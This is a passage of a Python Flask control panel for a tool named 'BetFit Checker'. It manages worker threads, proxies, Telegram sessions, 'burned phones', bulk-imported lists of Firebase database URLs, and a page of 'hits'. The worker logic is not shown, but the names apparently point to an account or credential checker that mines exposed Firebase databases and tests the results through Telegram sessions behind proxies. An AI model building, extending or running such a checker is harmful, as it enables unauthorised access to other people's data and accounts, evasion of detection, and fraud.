    instances = load_instances()
    if action == "start_all":
        for inst in instances:
            inst_id = str(inst.get("id"))
            if not RUNNING_FLAGS.get(inst_id, False):
                sess = inst.get("session", "")
                t = threading.Thread(target=firebase_worker, args=(inst_id, inst["start_idx"], inst["end_idx"], sess))
                t.daemon = True
                ACTIVE_THREADS[inst_id] = t
                t.start()
    elif action == "stop_all":
        for k in list(RUNNING_FLAGS.keys()):
            RUNNING_FLAGS[k] = False
    return redirect(url_for("index"))

@app.route("/api/save_settings", methods=["POST"])
@requires_auth
def save_settings_route():
    settings = get_settings()
    settings["proxy"] = request.form.get("proxy", "").strip()
    settings["betfit_bot"] = request.form.get("betfit_bot", BETFIT_BOT_USERNAME).strip()
    save_settings_data(settings)
    return redirect(url_for("index"))

@app.route("/api/test_proxy", methods=["POST"])
@requires_auth
def test_proxy():
    proxy = request.form.get("proxy", "").strip()
    if not proxy:
        return jsonify({"status": "error", "message": "No proxy"})
    proxies = {"http": proxy, "https": proxy}
    try:
        r = requests.get("https://api.ipify.org?format=json", proxies=proxies, timeout=10)
        if r.status_code == 200:
            return jsonify({"status": "success", "ip": r.json().get("ip")})
    except:
        pass
    return jsonify({"status": "error", "message": "Proxy failed"})

@app.route("/logs")
@requires_auth
def view_logs():
    return render_template("logs.html")

@app.route("/api/logs")
@requires_auth
def api_logs():
    return jsonify(list(LOG_BUFFER))

@app.route("/firebases")
@requires_auth
def view_firebases():
    return render_template("firebases.html", firebases=load_links())

@app.route("/api/firebases", methods=["POST"])
@requires_auth
def manage_firebases():
    action = request.form.get("action")

    if action == "add":
        raw = request.form.get("urls", "").strip()
        if raw:
            # Extract valid firebase URLs from pasted text (handles bulk paste)
            import re as _re
            new_urls = []
            # Try regex extraction first (handles Nexus export format, etc.)
            found = _re.findall(r'https?://[a-zA-Z0-9\-]+\.(?:firebaseio\.com|firebasedatabase\.app)', raw)
            if found:
                new_urls = found
            else:
                # Treat each line as a URL
                for line in raw.split('\n'):
                    line = line.strip().rstrip('/')
                    if line:
                        if not line.startswith('http'):
                            line = 'https://' + line
                        if 'firebaseio.com' in line or 'firebasedatabase.app' in line:
                            new_urls.append(line)

            if new_urls:
                existing = load_links()
                existing_set = set(u.rstrip('/') for u in existing)
                added = 0
                with FILE_LOCK:
                    with open(LINKS_FILE, "a") as f:
                        for url in new_urls:
                            url = url.rstrip('/')
                            if url not in existing_set:
                                f.write(url + "\n")
                                existing_set.add(url)
                                added += 1
                print(f"[+] Added {added} new Firebase links (skipped {len(new_urls) - added} duplicates)")

    elif action == "delete":
        idx = request.form.get("idx", type=int)
        if idx is not None:
            links = load_links()
            if 0 <= idx < len(links):
                removed = links.pop(idx)
                with FILE_LOCK:
                    with open(LINKS_FILE, "w") as f:
                        for link in links:
                            f.write(link + "\n")
                print(f"[+] Removed Firebase link #{idx}: {removed}")

    elif action == "clear_all":
        with FILE_LOCK:
            with open(LINKS_FILE, "w") as f:
                f.write("")
        print(f"[+] Cleared all Firebase links")

    return redirect(url_for("view_firebases"))

@app.route("/hits")
@requires_auth
def view_hits():
    hits = load_hits()
    hits.reverse()
    return render_template("hits.html", hits=hits)

# ==========================================
# MAIN
# ==========================================
if __name__ == '__main__':
    print(f"[*] BetFit Checker starting...")
    print(f"[*] TG Sessions: {len(load_tg_sessions())}")
    print(f"[*] Firebase Links: {len(load_links())}")
    print(f"[*] Burned Phones: {len(_burned_phones)}")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5003)))
